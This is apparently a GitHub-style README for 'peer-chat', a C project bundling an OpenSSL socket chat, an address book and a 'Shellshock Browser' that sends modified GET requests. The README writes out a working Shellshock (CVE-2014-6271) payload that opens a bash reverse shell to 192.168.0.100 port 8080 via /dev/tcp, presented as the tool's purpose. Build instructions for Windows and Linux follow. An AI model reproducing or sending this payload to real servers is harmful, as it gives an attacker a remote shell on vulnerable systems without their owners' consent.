# peer-chat
* Server and Client OpenSSL Peer Socket Chat (Windows/Linux)

    most Bug free
    
* Addressbook functionality (Windows/Linux)

    Entry has Bugs
    
* http/https Shellshock Browser (Windows/Linux)

    most Bug free
    
    A Webbrowser that has a modyfied GET Request. It supports HTTP and HTTPS Connections.
    
    **[A useful Link](http://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/#gref)**
    
    The Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"


# building

* On Windows: use DevC++ (latest) WIN32/WIN64 Compiler

with linker options:

-mwindows
-lssl
-lcrypto
-leay32 
-lwsock32
-lws2_32 
-lpthread
-s

Code profiling -std=ISO C99

* On Linux:

# make
# sudo make install
# sudo make uninstall
# make clean
# make version


** Tools **

**[Description](tools/Readme.md)**
